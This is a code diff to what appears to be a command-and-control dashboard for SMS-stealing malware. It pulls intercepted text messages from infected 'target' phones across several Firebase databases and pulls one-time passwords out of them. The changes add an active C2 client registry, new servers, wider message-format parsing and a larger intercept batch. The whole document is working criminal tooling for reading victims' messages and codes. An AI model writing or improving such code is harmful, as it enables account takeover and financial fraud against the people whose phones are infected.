@@ -137,6 +137,7 @@ const state = {
     devices: [],
     mutedDevices: new Set(),
     rawFullData: {},
+    activeClients: new Set(),
     deviceFilter: 'all',
     server1RecentSmsDevices: new Set(),
 
@@ -220,7 +221,9 @@ const PLANET_INFO = {
     paisa: { flag: '👑', sector: '0x03 // K-PARTY ADMIN PANEL RTDB', title: 'SERVER PAISA' },
     rupee: { flag: '🔴', sector: '0x04 // MISHRA-D9DB2 RTDB', title: 'SERVER RUPEE' },
     dollar: { flag: '💲', sector: '0x05 // RTO-CHALLAN-2CD79 RTDB', title: 'SERVER DOLLAR' },
-    euro: { flag: '💶', sector: '0x06 // HHHG-B94A2 RTDB', title: 'SERVER EURO' },
+    euro: { flag: '🔱', sector: '0x06 // HHHG-B94A2 RTDB', title: 'HULAMAN SERVER' },
+    hulaman: { flag: '🔱', sector: '0x06 // HHHG-B94A2 RTDB', title: 'HULAMAN SERVER' },
+    beta: { flag: '🧪', sector: '0x07 // JAYXGCCY RTDB', title: 'SERVER BETA' },
     // Compatibility aliases
     earth: { flag: '💵', sector: '0x01 // RED-PANEL SHAMSUL-2 RTDB', title: 'SERVER MONEY' },
     mars: { flag: '🔴', sector: '0x04 // MISHRA-D9DB2 RTDB', title: 'SERVER RUPEE' },
@@ -242,6 +245,7 @@ function selectServer(url, name = 'money') {
 
     const key = String(name).toLowerCase();
     document.body.setAttribute('data-planet', key);
+    if (typeof state !== 'undefined' && state) { state.activeClients = new Set(); state.extraFeeds = null; }
 
     const info = PLANET_INFO[key] || { flag: '⚡', sector: '0x00 // CYBER GRID PROXY', title: name.toUpperCase() };
 
@@ -272,6 +276,8 @@ function logout() {
 
     state.devices = [];
     state.rawFullData = {};
+    state.activeClients = new Set();
+    state.extraFeeds = null;
     state.server1RecentSmsDevices = new Set();
     const devList = document.getElementById('deviceList');
     if (devList) {
@@ -433,14 +439,21 @@ async function fetchDevices() {
     }
 
     try {
-        const [rList, rMuted, rData] = await Promise.all([
-            fetch(`${FB_URL}/${LIST_PATH}.json?shallow=true`).then(r => r.json()),
-            fetch(`${FB_URL}/user_muted_list.json?shallow=true`).then(r => r.json()),
-            fetch(`${FB_URL}/${DATA_PATH}.json`).then(r => r.json()),
+        const [rList, rMuted, rData, rClients] = await Promise.all([
+            fetch(`${FB_URL}/${LIST_PATH}.json?shallow=true`).then(r => r.json()).catch(() => ({})),
+            fetch(`${FB_URL}/user_muted_list.json?shallow=true`).then(r => r.json()).catch(() => ({})),
+            fetch(`${FB_URL}/${DATA_PATH}.json`).then(r => r.json()).catch(() => ({})),
+            fetch(`${FB_URL}/clients.json?shallow=true`).then(r => r.json()).catch(() => ({})),
         ]);
 
         state.mutedDevices = new Set(rMuted ? Object.keys(rMuted) : []);
-        const allIds = new Set([...Object.keys(rList || {}), ...state.mutedDevices]);
+        state.activeClients = new Set(rClients ? Object.keys(rClients) : []);
+        const allIds = new Set([
+            ...Object.keys(rList || {}),
+            ...Object.keys(rData || {}),
+            ...state.activeClients,
+            ...state.mutedDevices
+        ]);
         const merged = {};
         allIds.forEach(id => { merged[id] = (rData || {})[id] || { d_name: "Node-Target" }; });
 
@@ -468,11 +481,28 @@ function isServer1Active() {
            document.body.getAttribute('data-planet') === 'earth';
 }
 
+const PUSH_CHARS = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
+function decodeFirebasePushKey(key) {
+    if (!key || typeof key !== 'string' || key.length < 8) return 0;
+    let ts = 0;
+    for (let i = 0; i < 8; i++) {
+        const c = key[i];
+        const idx = PUSH_CHARS.indexOf(c);
+        if (idx === -1) return 0;
+        ts = ts * 64 + idx;
+    }
+    if (ts >= 1577836800000 && ts <= 2051222400000) return ts;
+    return 0;
+}
+
 function parseDateStrToTimestamp(str) {
     if (!str || typeof str !== 'string') return null;
     try {
         const hindiDigits = { '०': '0', '१': '1', '२': '2', '३': '3', '४': '4', '५': '5', '६': '6', '७': '7', '८': '8', '९': '9' };
-        const clean = str.replace(/[०-९]/g, d => hindiDigits[d] || d).trim();
+        const bengaliDigits = { '০': '0', '১': '1', '২': '2', '৩': '3', '৪': '4', '৫': '5', '৬': '6', '৭': '7', '৮': '8', '৯': '9' };
+        let clean = str.replace(/[०-९]/g, d => hindiDigits[d] || d);
+        clean = clean.replace(/[০-৯]/g, d => bengaliDigits[d] || d);
+        clean = clean.replace(/\./g, '').trim(); // normalize p.m. -> pm, a.m. -> am
 
         // Format: DD-Mon-YY or DD-Mon-YYYY (e.g. 09-Jul-26 23:39)
         const months = { jan:0, feb:1, mar:2, apr:3, may:4, jun:5, jul:6, aug:7, sep:8, oct:9, nov:10, dec:11 };
@@ -507,9 +537,16 @@ function parseDateStrToTimestamp(str) {
         // Slash format: DD/MM/YYYY or MM/DD/YYYY
         const mSlash = clean.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})(?:[ T](\d{1,2}):(\d{1,2})(?::(\d{1,2}))?)?/);
         if (mSlash) {
-            let day = parseInt(mSlash[1], 10);
-            let month = parseInt(mSlash[2], 10) - 1;
+            let p1 = parseInt(mSlash[1], 10);
+            let p2 = parseInt(mSlash[2], 10);
             const year = parseInt(mSlash[3], 10);
+            let day = p1;
+            let month = p2 - 1;
+            if (p2 > 12 && p1 <= 12) {
+                // MM/DD/YYYY format
+                month = p1 - 1;
+                day = p2;
+            }
             let h = mSlash[4] ? parseInt(mSlash[4], 10) : 0;
             const min = mSlash[5] ? parseInt(mSlash[5], 10) : 0;
             const sec = mSlash[6] ? parseInt(mSlash[6], 10) : 0;
@@ -526,14 +563,17 @@ function parseDateStrToTimestamp(str) {
 }
 
 function isDeviceOnline(devId, info) {
-    // 1. Standard check first (preserves exact behavior for Server 2, 3, and 4)
-    if (info && (info.status === true || info.status === 'online')) {
+    // 1. Standard check first (preserves exact behavior for Server 2, 3, 4, 5, 6)
+    if (info && (info.status === true || info.status === 'online' || String(info.status).toLowerCase() === 'true')) {
         return true;
     }
 
-    // 2. STRICT ISOLATION: Server 1 ONLY (red-panel-shamsul-2 / SERVER MONEY)
-    // Server 1 database does not store explicit status: "online" flags.
-    // Devices with messages or activity in the last 24 hours are marked online.
+    // 2. Active C2 client registry check (populated from /clients.json?shallow=true)
+    if (typeof state !== 'undefined' && state.activeClients && state.activeClients.has(devId)) {
+        return true;
+    }
+
+    // 3. Activity & Telemetry check (Server Money without explicit status flags)
     if (!isServer1Active()) {
         return false;
     }
@@ -800,19 +840,22 @@ async function fetchAllSms() {
     }
 
     try {
-        const rShallow = await fetch(`${FB_URL}/${SMS_PATH}.json?shallow=true`).then(r => r.json());
+        const rShallow = await fetch(`${FB_URL}/${SMS_PATH}.json?shallow=true`).then(r => r.json()).catch(() => ({}));
         let devIds = rShallow ? Object.keys(rShallow) : [];
 
-        // Prioritize devices with recent activity/lastUpdated so newest messages stream first
         if (state.rawFullData && Object.keys(state.rawFullData).length > 0) {
             devIds.sort((a, b) => {
+                const isClientA = state.activeClients && state.activeClients.has(a) ? 1 : 0;
+                const isClientB = state.activeClients && state.activeClients.has(b) ? 1 : 0;
+                if (isClientB !== isClientA) return isClientB - isClientA;
+
                 const timeA = state.rawFullData[a]?.lastUpdated || 0;
                 const timeB = state.rawFullData[b]?.lastUpdated || 0;
                 return timeB - timeA;
             });
         }
-        // Stream top 120 most active nodes for high performance & coverage
-        devIds = devIds.slice(0, 120);
+
+        devIds = devIds.slice(0, 150);
         const dict = {};
 
         for (let i = 0; i < devIds.length; i += 30) {
@@ -823,7 +866,6 @@ async function fetchAllSms() {
             results.forEach(r => { if (r.status === 'fulfilled' && r.value.d) dict[r.value.id] = r.value.d; });
             setStatus(`INTERCEPTS ${Math.min(i + 30, devIds.length)}/${devIds.length}…`, 'loading');
 
-            // Progressive render after first batch so latest intercepts appear on screen immediately
             if (i === 0) {
                 state.localSmsCache = { ...dict };
                 updateSmsTree(state.localSmsCache);
@@ -849,41 +891,70 @@ function updateSmsTree(data) {
     if (!data) data = state.localSmsCache;
     const showMuted = document.getElementById('showMutedSms')?.checked || false;
     const all = [];
+    const seen = new Set();
 
-    Object.entries(data).forEach(([devId, msgs]) => {
-        if (!msgs || typeof msgs !== 'object') return;
-        if (state.mutedDevices.has(devId) && !showMuted) return;
-        Object.entries(msgs).forEach(([k, v]) => {
-            if (!v || typeof v !== 'object') return;
-            const timeVal = v.date || v.time || v.TimeandDate || 'Unknown';
-            let parsedTs = 0;
-            if (v.timestamp) {
-                const n = Number(v.timestamp);
-                if (!isNaN(n) && n > 0) parsedTs = n;
-            }
-            if (!parsedTs) {
-                parsedTs = parseDateStrToTimestamp(timeVal) || 0;
-            }
+    function addMsg(devId, k, v) {
+        if (!v || typeof v !== 'object') return;
+        const timeVal = v.date || v.time || v.TimeandDate || v.created_at || 'Unknown';
+        let parsedTs = 0;
+        if (v.timestamp) {
+            const n = Number(v.timestamp);
+            if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
+        }
+        if (!parsedTs && v.created_at) {
+            const n = Number(v.created_at);
+            if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
+        }
+        if (!parsedTs && typeof timeVal === 'number' && timeVal > 0) {
+            parsedTs = timeVal > 1e11 ? timeVal : timeVal * 1000;
+        }
+        if (!parsedTs) {
+            parsedTs = parseDateStrToTimestamp(String(timeVal)) || 0;
+        }
+        if (!parsedTs) {
+            parsedTs = decodeFirebasePushKey(k);
+        }
 
-            if (isServer1Active() && parsedTs) {
-                const diff = Date.now() - parsedTs;
-                if (diff >= -600000 && diff <= 24 * 60 * 60 * 1000) {
-                    if (state.server1RecentSmsDevices) state.server1RecentSmsDevices.add(devId);
-                }
+        if (isServer1Active() && parsedTs) {
+            const diff = Date.now() - parsedTs;
+            if (diff >= -900000 && diff <= 24 * 60 * 60 * 1000) {
+                if (state.server1RecentSmsDevices) state.server1RecentSmsDevices.add(devId);
             }
+        }
 
-            all.push({
-                time: timeVal,
-                device: devId,
-                sender: v.sender || v.number || 'Unknown',
-                body: v.body || v.message || v.msg || '',
-                ts: parsedTs,
-                key: k
+        const sender = v.sender || v.from || v.number || v.phone || 'Unknown';
+        const body = v.body || v.message || v.msg || v.content || v.text || '';
+        if (!body && sender === 'Unknown') return;
+
+        const effectiveDev = devId && devId !== 'Broadcast' && devId !== 'SMS-Direct'
+            ? devId
+            : (v.device || v.targetDeviceId || v.phoneNumber || v.target || v.mobile || devId || 'Node-Target');
+
+        if (state.mutedDevices.has(effectiveDev) && !showMuted) return;
+
+        const dedupKey = `${effectiveDev}__${sender}__${body}__${Math.floor(parsedTs / 1000)}`;
+        if (seen.has(dedupKey)) return;
+        seen.add(dedupKey);
+
+        all.push({
+            time: typeof timeVal === 'number' ? new Date(parsedTs || timeVal).toLocaleString() : timeVal,
+            device: effectiveDev,
+            sender: sender,
+            body: body,
+            ts: parsedTs,
+            key: k
+        });
+    }
+
+    if (data && typeof data === 'object') {
+        Object.entries(data).forEach(([devId, msgs]) => {
+            if (!msgs || typeof msgs !== 'object') return;
+            Object.entries(msgs).forEach(([k, v]) => {
+                addMsg(devId, k, v);
             });
         });
-    });
+    }
 
-    // Chronological Sort: Highest timestamp (most recent) at the top (index 0)
     all.sort((a, b) => {
         const diff = (Number(b.ts) || 0) - (Number(a.ts) || 0);
         if (diff !== 0) return diff;
@@ -898,7 +969,6 @@ function updateSmsTree(data) {
     renderSmsPage();
 }
 
-// Helper to extract OTPs from SMS text
 function extractOtp(text) {
     if (!text) return null;
     const otpMatch = text.match(/\b\d{4,8}\b/);
@@ -1307,9 +1377,9 @@ async function openSheet(devId, extra = '') {
         if (data && typeof data === 'object') {
             const txt = Object.entries(data).filter(([k, v]) => typeof v !== 'object').map(([k, v]) => `${k}: ${v}`).join('\n');
             let statusPrefix = '';
-            if (!data.status && isServer1Active()) {
+            if ((!data.status || isServer1Active())) {
                 const onlineNow = isDeviceOnline(devId, data);
-                statusPrefix = `status: ${onlineNow ? 'ONLINE (ACTIVE IN LAST 24H)' : 'OFFLINE'}\n`;
+                statusPrefix = `status: ${onlineNow ? 'ONLINE (ACTIVE)' : 'OFFLINE'}\n`;
             }
             if (sheetInfo) sheetInfo.textContent = statusPrefix + (txt || 'No extra node parameters');
         }
@@ -1330,57 +1400,74 @@ function refreshSheetSms() {
 async function fetchSheetSms(devId, silent = false) {
     if (!silent) setStatus('INTERCEPTING NODE SMS…', 'loading');
     try {
-        const data = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`).then(r => r.json());
+        const dUserSms = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`).then(r => r.json()).catch(() => null);
         if (!silent) setStatus('ARMED // READY');
-        if (!data) {
+        if (!dUserSms) {
             const countEl = document.getElementById('sheetSmsCount');
             if (countEl) countEl.textContent = '0';
             return;
         }
 
         const msgs = [];
-        Object.entries(data).forEach(([k, v]) => {
+        const seenKeys = new Set();
+        Object.entries(dUserSms).forEach(([k, v]) => {
             if (!v || typeof v !== 'object') return;
-            const timeVal = v.date || v.time || v.TimeandDate || 'Unknown';
+            const timeVal = v.date || v.time || v.TimeandDate || v.created_at || 'Unknown';
             let parsedTs = 0;
             if (v.timestamp) {
                 const n = Number(v.timestamp);
-                if (!isNaN(n) && n > 0) parsedTs = n;
+                if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
+            }
+            if (!parsedTs && v.created_at) {
+                const n = Number(v.created_at);
+                if (!isNaN(n) && n > 0) parsedTs = n > 1e11 ? n : n * 1000;
+            }
+            if (!parsedTs && typeof timeVal === 'number' && timeVal > 0) {
+                parsedTs = timeVal > 1e11 ? timeVal : timeVal * 1000;
             }
             if (!parsedTs) {
-                parsedTs = parseDateStrToTimestamp(timeVal) || 0;
+                parsedTs = parseDateStrToTimestamp(String(timeVal)) || 0;
+            }
+            if (!parsedTs) {
+                parsedTs = decodeFirebasePushKey(k);
             }
 
             if (isServer1Active() && parsedTs) {
                 const diff = Date.now() - parsedTs;
-                if (diff >= -600000 && diff <= 24 * 60 * 60 * 1000) {
+                if (diff >= -900000 && diff <= 24 * 60 * 60 * 1000) {
                     if (state.server1RecentSmsDevices) state.server1RecentSmsDevices.add(devId);
                 }
             }
+
+            const sender = v.sender || v.from || v.number || v.phone || 'Unknown';
+            const body = v.body || v.message || v.msg || v.content || v.text || '';
+            const dedup = `${sender}__${body}__${Math.floor(parsedTs / 1000)}`;
+            if (seenKeys.has(dedup)) return;
+            seenKeys.add(dedup);
+
             msgs.push({
-                time: timeVal,
-                sender: v.sender || v.number || 'Unknown',
-                body: v.body || v.message || v.msg || '',
+                time: typeof timeVal === 'number' ? new Date(parsedTs || timeVal).toLocaleString() : timeVal,
+                sender: sender,
+                body: body,
                 ts: parsedTs,
                 key: k
             });
         });
+
         msgs.sort((a, b) => {
             const diff = (Number(b.ts) || 0) - (Number(a.ts) || 0);
             if (diff !== 0) return diff;
             if (b.key && a.key) return b.key.localeCompare(a.key);
             return 0;
         });
+
         state.sheetSmsAll = msgs;
         state.sheetPageIndex = 0;
         const countEl = document.getElementById('sheetSmsCount');
         if (countEl) countEl.textContent = msgs.length;
         renderSheetSmsPage();
     } catch (e) {
-        if (!silent) {
-            setStatus('ERROR', 'error');
-            showToast('Failed to intercept node SMS', 'error');
-        }
+        if (!silent) setStatus('ERROR', 'error');
     }
 }
 
